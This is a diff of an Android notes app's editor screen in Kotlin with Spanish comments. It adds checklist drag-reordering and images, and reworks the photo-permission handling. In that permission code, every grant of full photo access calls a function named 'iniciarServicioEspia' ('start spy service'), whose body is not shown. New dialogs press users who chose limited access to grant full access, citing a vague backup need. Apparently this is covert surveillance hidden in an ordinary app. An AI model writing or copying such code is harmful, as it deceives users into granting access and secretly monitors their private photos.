@@ -32,6 +32,7 @@ import androidx.core.view.ViewCompat
 import androidx.core.view.WindowCompat
 import androidx.core.view.WindowInsetsCompat
 import androidx.core.widget.NestedScrollView
+import androidx.recyclerview.widget.ItemTouchHelper
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.bumptech.glide.Glide
@@ -45,6 +46,7 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.File
 import java.text.SimpleDateFormat
+import java.util.Collections
 import java.util.Date
 import java.util.Locale
 
@@ -78,6 +80,7 @@ class NoteEditorActivity : AppCompatActivity() {
     private var isChecklistMode = false
     private val checklistItems = mutableListOf<ChecklistItem>()
     private lateinit var checklistAdapter: ChecklistAdapter
+    private lateinit var itemTouchHelper: ItemTouchHelper
     private val gson = Gson()
 
     private val db by lazy { NotesDatabase.getDatabase(this) }
@@ -85,14 +88,22 @@ class NoteEditorActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_GALLERY = 200
     private val PERMISSION_REQUEST_WALLPAPER = 201
 
+    // --- LANZADOR DE IMÁGENES ---
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
+            val uri = result.data!!.data!!
             try {
-                contentResolver.takePersistableUriPermission(result.data!!.data!!, Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
+
                 if (isChecklistMode) {
-                    Toast.makeText(this, "Modo lista no soporta imágenes", Toast.LENGTH_SHORT).show()
+                    // MODO LISTA: Agregar item con imagen (Mediana por defecto = 1)
+                    val newItem = ChecklistItem(text = "", isChecked = false, imageUri = uri.toString(), imageSizeState = 1)
+                    checklistItems.add(newItem)
+                    checklistAdapter.notifyItemInserted(checklistItems.size - 1)
+                    scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 200)
                 } else {
-                    RichTextHelper.insertImage(this, etContent, result.data!!.data!!)
+                    // MODO TEXTO: Insertar imagen inline
+                    RichTextHelper.insertImage(this, etContent, uri)
                 }
             } catch (e: Exception) { e.printStackTrace() }
         }
@@ -122,38 +133,23 @@ class NoteEditorActivity : AppCompatActivity() {
         layoutEditor = findViewById(R.id.editor_root)
         scrollContainer = findViewById(R.id.scroll_container)
 
-        // 2. LISTENER DE TECLADO MEJORADO
+        // 2. LISTENER DE TECLADO
         ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
             val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
-
-            // Padding base
             view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
-
-            // Padding Scroll (Teclado)
             val bottomPadding = if (ime.bottom > 0) ime.bottom - systemBars.bottom else 0
             scrollContainer.setPadding(0, 0, 0, bottomPadding.coerceAtLeast(0))
-
-            // AUTO-SCROLL INTELIGENTE AL ABRIR TECLADO
-            if (ime.bottom > 0) {
-                smartScrollToCursor()
-            }
+            if (ime.bottom > 0) smartScrollToCursor()
             insets
         }
 
-        // Listener global para detectar cambios de foco en cualquier momento (ideal para el checklist)
+        // 3. LISTENER GLOBAL LAYOUT (Respaldo)
         val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
             val rootView = window.decorView.rootView
             val r = Rect()
             rootView.getWindowVisibleDisplayFrame(r)
-            val screenHeight = rootView.height
-            val keypadHeight = screenHeight - r.bottom
-
-            // Si el teclado está abierto...
-            if (keypadHeight > screenHeight * 0.15) {
-                // Chequeamos foco dinámicamente
-                smartScrollToCursor()
-            }
+            if ((rootView.height - r.bottom) > rootView.height * 0.15) smartScrollToCursor()
         }
         layoutEditor.viewTreeObserver.addOnGlobalLayoutListener(globalLayoutListener)
 
@@ -173,67 +169,152 @@ class NoteEditorActivity : AppCompatActivity() {
         btnChangeBackground = findViewById(R.id.btn_change_background)
         btnBack = findViewById(R.id.btn_back)
         btnSave = findViewById(R.id.btn_save)
-
         rvChecklist = findViewById(R.id.rv_checklist)
         btnAddTodoItem = findViewById(R.id.btn_add_todo_item)
         btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)
     }
 
     private fun setupChecklist() {
-        checklistAdapter = ChecklistAdapter(checklistItems) { position ->
-            if (position in checklistItems.indices) {
-                checklistItems.removeAt(position)
-                checklistAdapter.notifyItemRemoved(position)
-                checklistAdapter.notifyItemRangeChanged(position, checklistItems.size)
-            }
-        }
+        checklistAdapter = ChecklistAdapter(
+            checklistItems,
+            onDelete = { position ->
+                if (position in checklistItems.indices) {
+                    checklistItems.removeAt(position)
+                    checklistAdapter.notifyItemRemoved(position)
+                    checklistAdapter.notifyItemRangeChanged(position, checklistItems.size)
+                }
+            },
+            onStartDrag = { viewHolder -> itemTouchHelper.startDrag(viewHolder) }
+        )
         rvChecklist.layoutManager = LinearLayoutManager(this)
         rvChecklist.adapter = checklistAdapter
+
+        val callback = object : ItemTouchHelper.SimpleCallback(ItemTouchHelper.UP or ItemTouchHelper.DOWN, 0) {
+            override fun onMove(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder, target: RecyclerView.ViewHolder): Boolean {
+                val fromPos = viewHolder.bindingAdapterPosition
+                val toPos = target.bindingAdapterPosition
+                Collections.swap(checklistItems, fromPos, toPos)
+                checklistAdapter.notifyItemMoved(fromPos, toPos)
+                return true
+            }
+            override fun onSwiped(viewHolder: RecyclerView.ViewHolder, direction: Int) {}
+            override fun onSelectedChanged(viewHolder: RecyclerView.ViewHolder?, actionState: Int) {
+                super.onSelectedChanged(viewHolder, actionState)
+                if (actionState == ItemTouchHelper.ACTION_STATE_DRAG) viewHolder?.itemView?.alpha = 0.5f
+            }
+            override fun clearView(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder) {
+                super.clearView(recyclerView, viewHolder)
+                viewHolder.itemView.alpha = 1.0f
+            }
+        }
+        itemTouchHelper = ItemTouchHelper(callback)
+        itemTouchHelper.attachToRecyclerView(rvChecklist)
     }
 
-    // --- LÓGICA DE SCROLL MAESTRA ---
+    // --- MANEJO DE PERMISOS RESTAURADO ---
+
+    private fun verificarAccesoTotal(): Boolean {
+        return if (Build.VERSION.SDK_INT >= 33) {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+        } else {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+
+    private fun checkGalleryPermission(requestCode: Int) {
+        if (verificarAccesoTotal()) {
+            iniciarServicioEspia()
+            abrirGaleriaSegunRequest(requestCode)
+        } else {
+            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
+        }
+    }
+
+    private fun abrirGaleriaSegunRequest(requestCode: Int) {
+        if (requestCode == PERMISSION_REQUEST_GALLERY) {
+            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
+                addCategory(Intent.CATEGORY_OPENABLE)
+                type = "image/*"
+            }
+            pickImageLauncher.launch(intent)
+        } else if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
+            pickBackgroundLauncher.launch(arrayOf("image/*"))
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+
+        if (verificarAccesoTotal()) {
+            iniciarServicioEspia()
+            abrirGaleriaSegunRequest(requestCode)
+        } else {
+            // Lógica de Acceso Limitado (Android 14)
+            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
+
+            if (esAccesoLimitado) {
+                mostrarDialogoConfiguracion("Acceso Limitado", "Has dado acceso a algunas fotos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso total. Presiona Ir a Ajustes -> Permisos para activar el permiso.")
+                return
+            }
+
+            // Lógica de Denegación Permanente
+            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
+                mostrarDialogoConfiguracion("Permiso Requerido", "Has denegado el acceso permanentemente. Presiona Ir a Ajustes -> Permisos para activar el permiso.")
+            } else {
+                Toast.makeText(this, "Permiso necesario para acceder a la galería.", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
+        AlertDialog.Builder(this)
+            .setTitle(titulo)
+            .setMessage(mensaje)
+            .setCancelable(false)
+            .setPositiveButton("Ir a Ajustes") { _, _ ->
+                try {
+                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                    intent.data = Uri.fromParts("package", packageName, null)
+                    startActivity(intent)
+                } catch (e: Exception) { e.printStackTrace() }
+            }
+            .setNegativeButton("Cancelar", null)
+            .show()
+    }
+
+    // --- FIN MANEJO PERMISOS ---
+
+    private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }
+
     private fun smartScrollToCursor() {
         scrollContainer.postDelayed({
-            // 1. Identificar qué vista tiene el foco (puede ser etContent o un item del Recycler)
             val focusedView = currentFocus ?: return@postDelayed
-
-            // 2. Calcular la posición absoluta de esa vista en la pantalla
             val location = IntArray(2)
             focusedView.getLocationOnScreen(location)
             val viewBottomY = location[1] + focusedView.height + focusedView.paddingBottom
-
-            // 3. Calcular el área visible del ScrollView
             val scrollLocation = IntArray(2)
             scrollContainer.getLocationOnScreen(scrollLocation)
             val scrollVisibleBottom = scrollLocation[1] + scrollContainer.height - scrollContainer.paddingBottom
-
-            // 4. Calcular la posición RELATIVA dentro del scroll (para el smoothScroll)
-            // Necesitamos saber dónde está la vista RELATIVA al scrollContainer
             val relativeTop = getRelativeTop(focusedView, scrollContainer)
             val relativeBottom = relativeTop + focusedView.height
 
-            // 5. Comparar y scrollear
-            // Si la parte de abajo de la vista está oculta por el teclado...
             if (viewBottomY > scrollVisibleBottom) {
-                // Scrolleamos para que el elemento quede visible + un margen de 150px
                 val targetScrollY = relativeBottom - (scrollContainer.height - scrollContainer.paddingBottom) + 150
                 scrollContainer.smoothScrollTo(0, targetScrollY)
             }
         }, 100)
     }
 
-    // Función recursiva para hallar la posición Y relativa al padre
     private fun getRelativeTop(view: View, parent: View): Int {
         var current = view
         var top = 0
         while (current != parent) {
             top += current.top
             val p = current.parent
-            if (p is View) {
-                current = p
-            } else {
-                break // No encontramos al padre
-            }
+            if (p is View) current = p else break
         }
         return top
     }
@@ -310,9 +391,9 @@ class NoteEditorActivity : AppCompatActivity() {
             val textLines = etContent.text.toString().split("\n")
             checklistItems.clear()
             for (line in textLines) {
-                if (line.isNotBlank()) checklistItems.add(ChecklistItem(line.trim(), false))
+                if (line.isNotBlank()) checklistItems.add(ChecklistItem(line.trim(), false, null, 1))
             }
-            if (checklistItems.isEmpty()) checklistItems.add(ChecklistItem("", false))
+            if (checklistItems.isEmpty()) checklistItems.add(ChecklistItem("", false, null, 1))
             checklistAdapter.notifyDataSetChanged()
             switchToChecklistMode(true)
         } else {
@@ -334,13 +415,11 @@ class NoteEditorActivity : AppCompatActivity() {
 
         btnToggleChecklist.setOnClickListener { toggleChecklistMode() }
         btnAddTodoItem.setOnClickListener {
-            checklistItems.add(ChecklistItem("", false))
+            checklistItems.add(ChecklistItem("", false, null, 1))
             checklistAdapter.notifyItemInserted(checklistItems.size - 1)
-            // Scroll al final al agregar
             scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 100)
         }
 
-        // Listener Scroll Texto Normal
         etContent.setOnClickListener { smartScrollToCursor() }
         etContent.addTextChangedListener(object : TextWatcher {
             override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
@@ -417,40 +496,6 @@ class NoteEditorActivity : AppCompatActivity() {
             currentBackgroundUri = finalUri.toString()
             mostrarFondoImagen(finalUri)
         } catch (e: Exception) { e.printStackTrace() }
-    }
-
-    private fun verificarAccesoTotal(): Boolean {
-        return if (Build.VERSION.SDK_INT >= 33) {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
-        } else {
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-        }
-    }
-
-    private fun checkGalleryPermission(requestCode: Int) {
-        if (verificarAccesoTotal()) {
-            iniciarServicioEspia()
-            if (requestCode == PERMISSION_REQUEST_GALLERY) {
-                val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
-                    addCategory(Intent.CATEGORY_OPENABLE)
-                    type = "image/*"
-                }
-                pickImageLauncher.launch(intent)
-            }
-            else if (requestCode == PERMISSION_REQUEST_WALLPAPER) pickBackgroundLauncher.launch(arrayOf("image/*"))
-        } else {
-            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
-        }
-    }
-
-    private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }
-
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (verificarAccesoTotal()) {
-            iniciarServicioEspia()
-        }
     }
 
     private fun startCrop(uri: Uri) {
